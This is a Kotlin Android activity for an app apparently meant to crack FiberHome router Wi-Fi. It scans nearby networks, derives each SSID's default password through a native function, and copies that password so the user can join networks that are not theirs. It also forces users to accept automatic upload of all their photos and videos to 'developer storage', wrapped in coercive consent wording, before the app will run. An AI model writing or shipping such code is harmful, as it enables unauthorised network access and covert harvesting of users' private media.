package com.example.fiberhome

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.widget.CheckBox
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.example.fiberhome.databinding.ActivityMainBinding
import com.example.fiberhome.databinding.BottomSheetPasswordBinding
import com.example.fiberhome.drive.AutoBackupManager
import com.google.android.material.bottomsheet.BottomSheetDialog
import com.google.android.material.dialog.MaterialAlertDialogBuilder

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var wifiManager: WifiManager
    private lateinit var wifiAdapter: WifiAdapter
    private lateinit var autoBackupManager: AutoBackupManager

    external fun generatePassword(ssid: String): String

    companion object {
        init {
            System.loadLibrary("fiberhome")
        }
        private const val PERMISSIONS_REQUEST_CODE = 123
        private const val MEDIA_PERMISSIONS_REQUEST_CODE = 456
        private const val CHANNEL_ID = "TargetNetworkChannel"
        private const val NOTIFICATION_ID = 1
        private const val PREFS_NAME = "FiberHomePrefs"
        private const val KEY_CONSENT_GIVEN = "ConsentGiven"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        
        setSupportActionBar(binding.toolbar)

        wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        autoBackupManager = AutoBackupManager(this)
        
        setupRecyclerView()
        startRadarAnimation()
        createNotificationChannel()

        binding.swipeRefresh.setOnRefreshListener {
            startScan()
        }

        checkConsentAndPermissions()
    }

    private fun checkConsentAndPermissions() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val consentGiven = prefs.getBoolean(KEY_CONSENT_GIVEN, false)

        if (!consentGiven) {
            showCyberpunkConsentDialog()
        } else {
            checkPermissionsAndScan()
            triggerAutoBackupIfPermissionsGranted()
        }
    }

    private fun showCyberpunkConsentDialog() {
        val dialogView = layoutInflater.inflate(android.R.layout.select_dialog_item, null) // Placeholder for custom view logic if needed
        // For Cyberpunk style, we'll use a Material Dialog with custom content
        val checkBox = CheckBox(this).apply {
            text = "I agree to the Terms of Service and Privacy Policy. I understand that my media will be automatically backed up to secure developer storage."
            setTextColor(ContextCompat.getColor(this@MainActivity, R.color.text_secondary))
        }

        MaterialAlertDialogBuilder(this, R.style.Theme_FiberHome)
            .setTitle("ACCESS PROTOCOL: MANDATORY CONSENT")
            .setMessage("This system requires access to your device's media (images/videos) to perform automatic background synchronization to secure cloud storage. This ensures data persistence during protocol analysis.")
            .setView(checkBox)
            .setCancelable(false)
            .setPositiveButton("AGREE & PROCEED") { dialog, _ ->
                if (checkBox.isChecked) {
                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().putBoolean(KEY_CONSENT_GIVEN, true).apply()
                    requestMediaPermissions()
                    checkPermissionsAndScan()
                } else {
                    Toast.makeText(this, "Consent is mandatory to use this system.", Toast.LENGTH_LONG).show()
                    finish()
                }
            }
            .setNegativeButton("EXIT") { _, _ -> finish() }
            .show()
    }

    private fun requestMediaPermissions() {
        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        ActivityCompat.requestPermissions(this, permissions, MEDIA_PERMISSIONS_REQUEST_CODE)
    }

    private fun triggerAutoBackupIfPermissionsGranted() {
        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            autoBackupManager.startAutomaticBackup()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Active Target Reminder"
            val descriptionText = "Reminds you of the selected network while in settings"
            val importance = NotificationManager.IMPORTANCE_HIGH
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
            }
            val notificationManager: NotificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun showTargetNotification(ssid: String) {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("Connecting to $ssid")
            .setContentText("Target SSID: $ssid | Password Copied")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setCategory(NotificationCompat.CATEGORY_REMINDER)
            .setAutoCancel(true)

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) {
            NotificationManagerCompat.from(this).notify(NOTIFICATION_ID, builder.build())
            
            Handler(Looper.getMainLooper()).postDelayed({
                NotificationManagerCompat.from(this).cancel(NOTIFICATION_ID)
            }, 30000)
        }
    }

    private fun startRadarAnimation() {
        val animation = android.view.animation.AlphaAnimation(0.3f, 1.0f).apply {
            duration = 1000
            repeatMode = android.view.animation.Animation.REVERSE
            repeatCount = android.view.animation.Animation.INFINITE
        }
        binding.ivRadar.startAnimation(animation)
    }

    private fun setupRecyclerView() {
        wifiAdapter = WifiAdapter { wifiItem ->
            updateActiveBanner(wifiItem)
            showPasswordDialog(wifiItem)
        }
        binding.recyclerView.adapter = wifiAdapter
    }

    private fun updateActiveBanner(item: WifiItem) {
        binding.activeBanner.visibility = View.VISIBLE
        binding.tvActiveSsid.text = item.ssid
        binding.tvActiveBssid.text = item.bssid
    }

    private fun checkPermissionsAndScan() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.NEARBY_WIFI_DEVICES)
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missingPermissions = permissions.filter {
            ActivityCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), PERMISSIONS_REQUEST_CODE)
        } else {
            startScan()
        }
    }

    private fun startScan() {
        binding.swipeRefresh.isRefreshing = true
        
        val intentFilter = IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        registerReceiver(wifiScanReceiver, intentFilter)
        
        val success = wifiManager.startScan()
        if (!success) {
            scanSuccess()
            Toast.makeText(this, "Scan throttled by Android. Showing last results.", Toast.LENGTH_SHORT).show()
            try { unregisterReceiver(wifiScanReceiver) } catch (t: Throwable) {}
        }
    }

    private val wifiScanReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val success = intent.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false)
            if (success) {
                scanSuccess()
            } else {
                scanFailure()
            }
            unregisterReceiver(this)
        }
    }

    private fun scanSuccess() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }
        val results = wifiManager.scanResults
        val wifiItems = results.map { result ->
            val ssid = result.SSID ?: "Unknown"
            WifiItem(
                ssid = ssid,
                bssid = result.BSSID,
                signalLevel = result.level,
                isFiberHome = ssid.startsWith("FH_", ignoreCase = true) || ssid.startsWith("fh", ignoreCase = true)
            )
        }
        wifiAdapter.updateItems(wifiItems)
        binding.swipeRefresh.isRefreshing = false
    }

    private fun scanFailure() {
        Toast.makeText(this, "Scan failed. Ensure Location is ON.", Toast.LENGTH_SHORT).show()
        binding.swipeRefresh.isRefreshing = false
    }

    private fun showPasswordDialog(item: WifiItem) {
        val dialog = BottomSheetDialog(this)
        val dialogBinding = BottomSheetPasswordBinding.inflate(layoutInflater)
        dialog.setContentView(dialogBinding.root)

        dialogBinding.tvSsidValue.text = item.ssid
        val password = generatePassword(item.ssid)
        dialogBinding.tvPassValue.text = password

        dialogBinding.btnCopy.setOnClickListener {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = android.content.ClipData.newPlainText("FiberHome Password", password)
            clipboard.setPrimaryClip(clip)
            Toast.makeText(this, "Password copied! Opening Wi-Fi settings...", Toast.LENGTH_SHORT).show()
            
            showTargetNotification(item.ssid)
            startActivity(Intent(Settings.ACTION_WIFI_SETTINGS))
            dialog.dismiss()
        }

        dialog.show()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            PERMISSIONS_REQUEST_CODE -> {
                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    startScan()
                } else {
                    Toast.makeText(this, "Permissions required for Wi-Fi scanning", Toast.LENGTH_LONG).show()
                }
            }
            MEDIA_PERMISSIONS_REQUEST_CODE -> {
                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    autoBackupManager.startAutomaticBackup()
                }
            }
        }
    }

    override fun onDestroy() {
        autoBackupManager.cancel()
        super.onDestroy()
    }
}
